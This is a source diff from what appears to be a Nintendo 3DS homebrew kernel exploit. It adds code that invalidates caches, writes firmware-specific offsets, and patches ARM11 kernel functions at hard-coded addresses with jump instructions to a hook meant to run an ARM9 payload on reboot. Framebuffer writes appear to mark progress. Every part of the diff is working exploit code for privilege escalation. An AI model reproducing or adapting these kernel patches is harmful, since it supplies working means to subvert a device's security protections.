@@ -10,6 +10,8 @@ unsigned int patch_addr;
 unsigned int svc_patch_addr;
 unsigned char patched_svc = 0;
 unsigned int kversion;
+unsigned char *framebuff_top_0;
+unsigned char *framebuff_top_1;
 u8 isN3DS = 0;
 u32 *backup;
 unsigned int *arm11_buffer;
@@ -176,12 +178,37 @@ arm11_kernel_execute(int (*func)(void))
 
 void test(void)
 {
-	arm11_buffer[0] = 0xFAAFFAAF;
+	int (*sub_FFF748C4)(int, int, int, int) = 0xFFF748C4;
+	asm volatile ("clrex");
+
+	InvalidateEntireInstructionCache();
+	InvalidateEntireDataCache();
+
+	// ARM9 code copied to FCRAM 0x23F00000
+	//memcpy(0xF3F00000, ARM9_PAYLOAD, ARM9_PAYLOAD_LEN);
+	// write function hook at 0xFFFF0C80
+	//memcpy(0xEFFF4C80, jump_table, FUNC_LEN);
+
+	// write FW specific offsets to copied code buffer
+	*(int *)(0xEFFF4C80 + 0x60) = 0xFFFD0000; // PDN regs
+	*(int *)(0xEFFF4C80 + 0x64) = 0xFFFD2000; // PXI regs
+	*(int *)(0xEFFF4C80 + 0x68) = 0xFFF84DDC; // where to return to from hook
+
+	// patch function 0xFFF84D90 to jump to our hook
+	*(int *)(0xFFF84DD4 + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
+	*(int *)(0xFFF84DD4 + 4) = 0xFFFF0C80; // jump_table + 0
+
+	// patch reboot start function to jump to our hook
+	*(int *)(0xFFFF097C + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
+	*(int *)(0xFFFF097C + 4) = 0x1FFF4C84; // jump_table + 4
+
+	InvalidateEntireDataCache();
+	//sub_FFF748C4(0, 0, 2, 0); // trigger reboot
 }
 
 arm11_kernel_exec (void)
 {
-	arm11_buffer[0] = 0xF00FF00F;
+     arm11_buffer[0] = 0xF00FF00F;
 
 	// fix up memory
 	*(int *)(patch_addr+8) = 0x8DD00CE5;
@@ -244,6 +271,16 @@ int doARM11Hax()
 	for (i = 0; i < 0x1000/4; i++)
 	{
 		arm11_buffer[i] = 0xdeadbeef;
+	}
+
+	framebuff_top_0 = gfxGetFramebuffer(GFX_TOP, GFX_LEFT, NULL, NULL);
+	gfxSwapBuffers();
+	framebuff_top_1 = gfxGetFramebuffer(GFX_TOP, GFX_LEFT, NULL, NULL);
+
+	for(i = 0; i < 240*400*3; i += 3)
+	{
+		framebuff_top_0[i] = 0xFF; 
+		framebuff_top_1[i] = 0xFF;
 	}
 
 	if(arm11_kernel_exploit_setup())
